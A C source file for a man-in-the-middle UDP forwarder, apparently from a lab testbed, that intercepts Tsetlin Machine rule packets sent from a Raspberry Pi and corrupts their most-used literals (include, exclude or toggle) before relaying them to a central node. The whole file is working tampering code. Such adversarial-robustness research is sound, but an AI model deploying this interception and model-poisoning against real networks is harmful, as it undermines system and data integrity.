/* ============================================================
   LAPTOP MITM FORWARDER  (compiled, single program)

   Receives the TM packets the RPi (connected to the laptop) sends, corrupts the
   chosen literals, and routes the packets on to the CENTRAL node.

   Attack is selected by a number:   0 = INCLUDE   1 = EXCLUDE   2 = TOGGLE

   build:   gcc -O3 forwarder.c -o forwarder
   run  :   ./forwarder <attack 0|1|2> [k]
            ./forwarder 2 4          # toggle the 4 most-used literals in every rule
   Edit the IPs/ports in the CONFIG block below for your testbed, then recompile.
   ============================================================ */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

/* ----------------------- CONFIG (edit, then recompile) ----------------------- */
#define LISTEN_IP      "0.0.0.0"       /* laptop interface facing the RPi ("0.0.0.0" = all) */
#define LISTEN_PORT    5001            /* port the RPi sends to on the laptop               */
#define CENTRAL_IP     "10.42.0.59"    /* DEST: the central node                            */
#define CENTRAL_PORT   5001            /* port the central receiver listens on              */
#define SRC_IP         ""              /* SRC of forwarded packets ("" = OS default; or the
                                          laptop's 10.42.0.x address toward the central)    */
#define DEFAULT_K      2               /* literals attacked if k not given on the command line */
/* ----------------------------------------------------------------------------- */

#define HEADER         4
#define RULE_BYTES     45
#define RULES_PER_PK   12
#define DG_ENC         956

/* most-used literals in the trained clause banks (0..355), most-used first */
static const int TOP_LITERALS[20] = {
    323, 327, 326, 294, 322, 328, 349, 185, 324, 353,
    293, 321, 292, 351, 348, 350, 330, 184, 186, 291};

/* datagram byte + bit mask of literal `lit` of rule `rule` (Hamming data bit; parity untouched) */
static void literal_bit(int rule, int lit, int *byte, uint8_t *mask)
{
    int B = RULE_BYTES * rule + lit / 8, b = lit % 8;
    int cw = (b >= 4) ? 2 * B : 2 * B + 1;        /* high nibble -> 1st codeword, low -> 2nd */
    static const int dpos[4] = {2, 4, 5, 6};      /* D1..D4 positions in the 7-bit codeword  */
    int enc_bit = 7 * cw + dpos[3 - (b % 4)];
    *byte = HEADER + enc_bit / 8;
    *mask = (uint8_t)(0x80 >> (enc_bit % 8));
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <attack 0=include 1=exclude 2=toggle> [k]\n", argv[0]);
        return 1;
    }
    int attack = atoi(argv[1]);
    int k = (argc > 2) ? atoi(argv[2]) : DEFAULT_K;
    if (attack < 0 || attack > 2) { fprintf(stderr, "attack must be 0, 1 or 2\n"); return 1; }
    if (k < 0 || k > 20) { fprintf(stderr, "k must be 0..20\n"); return 1; }
    const char *name[3] = {"INCLUDE", "EXCLUDE", "TOGGLE"};

    /* precompute every (byte, mask) the attack changes in each datagram: k literals x 12 rules */
    int n_tg = k * RULES_PER_PK, bytes[20 * RULES_PER_PK];
    uint8_t masks[20 * RULES_PER_PK];
    int t = 0;
    for (int r = 0; r < RULES_PER_PK; r++)
        for (int i = 0; i < k; i++)
            literal_bit(r, TOP_LITERALS[i], &bytes[t], &masks[t]), t++;

    /* receive socket (from the RPi) */
    int rx = socket(AF_INET, SOCK_DGRAM, 0);
    int yes = 1, rbuf = 8 * 1024 * 1024;
    setsockopt(rx, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    setsockopt(rx, SOL_SOCKET, SO_RCVBUF, &rbuf, sizeof(rbuf));
    struct sockaddr_in la = {0};
    la.sin_family = AF_INET; la.sin_port = htons(LISTEN_PORT);
    la.sin_addr.s_addr = inet_addr(LISTEN_IP);
    if (bind(rx, (struct sockaddr *)&la, sizeof(la)) < 0) { perror("bind"); return 1; }

    /* forward socket (to the central node) */
    int tx = socket(AF_INET, SOCK_DGRAM, 0);
    if (SRC_IP[0]) {
        struct sockaddr_in sa = {0};
        sa.sin_family = AF_INET; sa.sin_addr.s_addr = inet_addr(SRC_IP);
        if (bind(tx, (struct sockaddr *)&sa, sizeof(sa)) < 0) perror("bind src (ignored)");
    }
    struct sockaddr_in ca = {0};
    ca.sin_family = AF_INET; ca.sin_port = htons(CENTRAL_PORT);
    ca.sin_addr.s_addr = inet_addr(CENTRAL_IP);

    printf("MITM forwarder: %s k=%d  (%d bit positions per datagram)\n", name[attack], k, n_tg);
    printf("listen %s:%d  ->  forward %s:%d\n", LISTEN_IP, LISTEN_PORT, CENTRAL_IP, CENTRAL_PORT);

    uint8_t buf[2048];
    long n_fwd = 0, n_pass = 0;
    for (;;) {
        ssize_t len = recv(rx, buf, sizeof(buf), 0);
        if (len <= 0) continue;
        if (len == DG_ENC) {
            for (int i = 0; i < n_tg; i++) {
                if (attack == 0)      buf[bytes[i]] |= masks[i];          /* include */
                else if (attack == 1) buf[bytes[i]] &= (uint8_t)~masks[i];/* exclude */
                else                  buf[bytes[i]] ^= masks[i];          /* toggle  */
            }
            n_fwd++;
        } else {
            n_pass++;                                                     /* wrong size -> pass through */
        }
        sendto(tx, buf, len, 0, (struct sockaddr *)&ca, sizeof(ca));
        if ((n_fwd + n_pass) % 200 == 0) {
            printf("\rforwarded %ld corrupted, %ld passthrough", n_fwd, n_pass);
            fflush(stdout);
        }
    }
    return 0;
}
